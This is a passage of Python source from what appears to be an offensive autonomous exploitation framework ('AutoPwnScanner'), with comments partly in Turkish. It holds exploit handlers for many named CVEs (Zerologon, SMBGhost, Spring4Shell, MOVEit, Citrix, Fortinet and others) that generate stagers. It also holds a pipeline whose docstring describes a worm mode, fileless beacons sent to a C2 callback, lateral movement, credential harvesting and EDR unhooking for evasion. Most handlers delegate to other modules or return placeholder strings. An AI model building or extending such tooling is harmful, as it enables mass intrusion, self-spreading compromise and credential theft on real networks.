        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=445,
            cve_id=vuln.cve, service_product="Windows",
        )
        if stager:
            return {
                "type": "ntlm_relay", "method": "petitpotam_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "ntlm_relay", "method": "petitpotam",
                "target": target.ip, "output": "PetitPotam coercion triggered"}

    def _exploit_smbghost(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=445,
            cve_id=vuln.cve, service_product="Windows",
        )
        if stager:
            return {
                "type": "bsod_or_shell", "method": "smbghost_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "bsod_or_shell", "method": "smbghost",
                "target": target.ip, "output": "SMBGhost exploit sent"}

    def _exploit_psexec(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=445,
            cve_id=vuln.cve, service_product="Windows",
        )
        if stager:
            return {
                "type": "psexec", "method": "pass_the_hash_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "psexec", "method": "pass_the_hash",
                "target": target.ip, "output": "PsExec ready with captured hash"}

    def _exploit_certifried(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=636,
            cve_id=vuln.cve, service_product="AD CS",
        )
        if stager:
            return {
                "type": "domain_admin", "method": "certifried_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "domain_admin", "method": "certifried",
                "target": target.ip, "output": "Certifried privesc chain ready"}

    def _exploit_jenkins(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=8080,
            cve_id=vuln.cve, service_product="Jenkins",
        )
        if stager:
            return {
                "type": "rce", "method": "jenkins_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "rce", "method": "jenkins",
                "target": target.ip, "output": "Jenkins script console accessed"}

    def _exploit_ghostcat(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "file_read", "method": "ghostcat",
                "target": target.ip, "output": "AJP file read successful"}

    def _exploit_apache_traversal(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=80,
            cve_id=vuln.cve, service_product="Apache",
        )
        if stager:
            return {
                "type": "rce", "method": "apache_traversal_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "rce", "method": "apache_traversal",
                "target": target.ip, "output": "Apache path traversal to RCE"}

    def _exploit_vcenter(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "rce", "method": "vcenter",
                "target": target.ip, "output": "vCenter arbitrary file upload successful"}

    def _exploit_outlook_ntlm(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "ntlm_leak", "method": "outlook_cal",
                "target": target.ip, "output": "Malicious calendar invite crafted"}

    def _exploit_citrix_adc(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=443,
            cve_id=vuln.cve, service_product="Citrix",
        )
        if stager:
            return {
                "type": "rce", "method": "citrix_adc_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "rce", "method": "citrix_adc",
                "target": target.ip, "output": "Citrix ADC RCE triggered"}

    def _exploit_fortinet_sslvpn(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=443,
            cve_id=vuln.cve, service_product="FortiOS",
        )
        if stager:
            return {
                "type": "rce", "method": "fortinet_sslvpn_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "rce", "method": "fortinet_sslvpn",
                "target": target.ip, "output": "FortiGate heap overflow exploited"}

    def _exploit_moveit(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=443,
            cve_id=vuln.cve, service_product="MOVEit",
        )
        if stager:
            return {
                "type": "rce", "method": "moveit_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {"type": "rce", "method": "moveit",
                "target": target.ip, "output": "MOVEit SQL injection to RCE successful"}

    def _exploit_confluence(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=8090,
            cve_id=vuln.cve, service_product="Confluence",
        )
        if stager:
            return {
                "type": "rce", "method": "confluence_ognl_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {
            "type": "rce", "method": "confluence_ognl",
            "target": target.ip, "output": "Confluence OGNL injection successful!"
        }

    def _exploit_heartbleed(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        return {"type": "info_disclosure", "method": "heartbleed",
                "target": target.ip, "output": "Memory leaked, searching for credentials..."}

    def _exploit_zerologon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=135,
            cve_id=vuln.cve, service_product="Windows DC",
        )
        if stager:
            return {
                "type": "domain_admin", "method": "zerologon_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {
            "type": "domain_admin", "method": "zerologon",
            "target": target.ip,
            "output": "DC machine account password set to empty! DCSync now possible.",
        }

    def _exploit_spring4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        stager = self.orchestrator.weaponize_chain(
            target_ip=target.ip, port=8080,
            cve_id=vuln.cve, service_product="Spring",
        )
        if stager:
            return {
                "type": "webshell", "method": "spring4shell_orchestrated",
                "target": target.ip,
                "output": f"[ORCHESTRATOR] {stager.expected_result}",
                "stager": stager.to_dict(),
            }
        return {
            "type": "webshell", "method": "spring4shell",
            "target": target.ip,
            "shell_url": f"http://{target.ip}:8080/shell.jsp",
            "output": "Spring4Shell webshell deployed!",
        }
        
    def generate_report(self, session_id: str) -> Dict[str, Any]:
        """Generate scan report"""
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        critical_count = 0
        high_count = 0

        vuln_details = []
        for target in session.discovered_targets.values():
            # İmza tabanlı açıklar
            for vuln_id in target.vulnerabilities:
                vuln = self.VULNERABILITIES.get(vuln_id)
                if vuln:
                    if vuln.severity == Severity.CRITICAL:
                        critical_count += 1
                    elif vuln.severity == Severity.HIGH:
                        high_count += 1

                    vuln_details.append({
                        "target": target.ip,
                        "vuln": vuln.name,
                        "cve": vuln.cve,
                        "severity": vuln.severity.value,
                        "exploited": target.exploited
                    })

            # Sürüm tabanlı N-Day bulgular
            for finding in target.version_findings:
                sev = str(finding.get("severity", "medium")).lower()
                if sev == "critical":
                    critical_count += 1
                elif sev == "high":
                    high_count += 1

                vuln_details.append({
                    "target": target.ip,
                    "vuln": finding.get("name", finding.get("cve", "")),
                    "cve": finding.get("cve", ""),
                    "severity": sev,
                    "version": finding.get("version"),
                    "product": finding.get("product"),
                    "exploited": target.exploited,
                    "exploit_sources": finding.get("exploit_sources", [])
                })

        version_info = {
            t.ip: t.service_versions
            for t in session.discovered_targets.values()
            if t.service_versions
        }

        return {
            "session_id": session_id,
            "scan_time": session.created_at,
            "targets_scanned": len(session.targets),
            "targets_discovered": len(session.discovered_targets),
            "targets_pwned": session.pwned_count,
            "vulnerabilities": {
                "critical": critical_count,
                "high": high_count,
                "total": len(vuln_details)
            },
            "details": vuln_details,
            "version_info": version_info,
            "shells": [
                {"target": t.ip, "shells": t.shells}
                for t in session.discovered_targets.values()
                if t.shells
            ]
        }
        
    def get_vulnerability_list(self) -> List[Dict[str, Any]]:
        """Get list of all supported vulnerabilities"""
        return [
            {
                "id": v.vuln_id,
                "name": v.name,
                "cve": v.cve,
                "severity": v.severity.value,
                "description": v.description,
                "affected": v.affected_products,
                "ports": v.ports
            }
            for v in self.VULNERABILITIES.values()
        ]
        
    def get_statistics(self) -> Dict[str, Any]:
        """Get scanner statistics"""
        total_pwned = sum(s.pwned_count for s in self.sessions.values())
        
        return {
            "total_sessions": len(self.sessions),
            "total_targets_pwned": total_pwned,
            "supported_vulnerabilities": len(self.VULNERABILITIES),
            "critical_vulns": sum(1 for v in self.VULNERABILITIES.values() if v.severity == Severity.CRITICAL),
            "high_vulns": sum(1 for v in self.VULNERABILITIES.values() if v.severity == Severity.HIGH),
            "active_shells": len(self.shells)
        }

    def run_autonomous_pwn_with_hunter(
        self,
        targets: List[str],
        initial_credentials: Optional[List[Dict[str, str]]] = None,
        domain: str = "",
        hunter_mode: str = "worm",
        max_threads: int = 50,
        max_depth: int = 10,
        auto_exploit: bool = True,
        enable_hw_unhook: bool = False,
        enable_pacing: bool = False,
    ) -> Dict[str, Any]:
        """
        Tam otonom pwn pipeline'ı — scanner + hunter köprüsü.

        Akış:
          1. AutoPwnScanner ile hedefleri tara, zafiyet bul, stager üret.
          2. HunterAutopwnBridge ile bulguları AutonomousHunter'a inject et.
          3. Hunter'ın _attempt_pivot'ını stager-triggering ile replace et.
          4. Hunter'ı başlat — zafiyetli makinelere fileless beacon inject et.
          5. Operasyon özetini döndür.

        Parametreler
        ------------
        targets            : IP/CIDR listesi
        initial_credentials: [{"username","password"/"nt_hash","domain"}] opsiyonel
        domain             : Hedef AD domaini
        hunter_mode        : stealth / aggressive / stealth_full / worm
        max_threads        : Scanner thread sayısı
        max_depth          : Hunter pivot derinliği
        auto_exploit       : Scanner otomatik exploit açık mı
        enable_hw_unhook   : HWUnhooker (DR0-DR3) aktif edilsin mi
        enable_pacing      : HunterPacer (anti-honey-token) aktif edilsin mi

        Dönüş
        ------
        {
            "bridge_report": {...},
            "hunter_report": {...},
            "scanner_session_id": "...",
            "pwned_targets": [...]
        }
        """
        # Lazy import to avoid circular dependency:
        # evasion.autonomous_hunter → cybermodules.lateral_movement → cyberapp.routes.lateral
        from tools.hunter_autopwn_bridge import HunterAutopwnBridge
        from evasion.autonomous_hunter import AutoPivotChain, HunterMode

        initial_credentials = initial_credentials or []

        # ── Phase 1: Scan ────────────────────────────────────────
        session = self.create_session(targets=targets, auto_exploit=auto_exploit)
        self.start_scan(session.session_id, max_threads=max_threads)

        # ── Phase 1.5: Orchestrator HW-Unhooker Integration ─────
        if enable_hw_unhook:
            self.orchestrator.enable_hw_unhook = True
            if self.orchestrator._hw_unhooker is None:
                from evasion.hw_unhooker import HWUnhooker
                self.orchestrator._hw_unhooker = HWUnhooker()

        # ── Phase 2: Hunter oluştur ─────────────────────────────
        scan_id = session.session_id
        hunter = AutoPivotChain(
            scan_id=scan_id,
            initial_target=targets[0] if targets else "",
            initial_credentials=initial_credentials,
            domain=domain,
            mode=HunterMode(hunter_mode),
            max_depth=max_depth,
            offline=True,
        )

        # ── Phase 3: Bridge ─────────────────────────────────────
        bridge = HunterAutopwnBridge(
            scanner=self,
            hunter=hunter,
            c2_url=f"http://{self.callback_host}:{self.callback_port}",
            enable_pacing=enable_pacing,
        )
        bridge.inject_findings(session)
        bridge.arm_hunter()

        # Store bridge reference on session for API access
        session._bridge = bridge

        # ── Phase 4: Autonomous hunt ─────────────────────────────
        hunter.start()
        hunter_report = hunter.wait(timeout=None)

        # ── Phase 5: Summary ────────────────────────────────────
        bridge_summary = bridge.operation_summary()

        pwned_targets = [
            {"ip": t.ip, "cves": t.vulnerabilities, "method": t.compromise_method}
            for t in session.discovered_targets.values()
            if t.exploited or t.compromised if hasattr(t, 'compromised') and t.compromised
        ]
        # Hunter'dan da compromised olanları ekle
        for ht in hunter.targets:
            if ht.compromised and not any(p['ip'] == ht.ip for p in pwned_targets):
                pwned_targets.append({
                    "ip": ht.ip,
                    "cves": [],
                    "method": ht.compromise_method,
                })

        return {
            "bridge_report": bridge_summary,
            "hunter_report": {
                "scan_id": hunter_report.scan_id,
                "state": hunter_report.state.value,
                "targets_discovered": hunter_report.targets_discovered,
                "hosts_compromised": hunter_report.hosts_compromised,
                "credentials_harvested": hunter_report.credentials_harvested,
                "lateral_moves_attempted": hunter_report.lateral_moves_attempted,
                "lateral_moves_successful": hunter_report.lateral_moves_successful,
                "pivot_path": hunter_report.pivot_path,
                "errors": hunter_report.errors,
            },
            "scanner_session_id": session.session_id,
            "pwned_targets": pwned_targets,
            "beacons_confirmed": bridge_summary.get("beacons_confirmed", 0),
            "stagers_triggered": bridge_summary.get("stagers_triggered", 0),
            "pace_log": bridge_summary.get("pace_log", []),
            "pacing_enabled": enable_pacing,
            "hw_unhook_enabled": enable_hw_unhook,
        }


# Singleton instance
_autopwn_instance = None

def get_autopwn_scanner() -> AutoPwnScanner:
    global _autopwn_instance
    if _autopwn_instance is None:
        _autopwn_instance = AutoPwnScanner()
    return _autopwn_instance
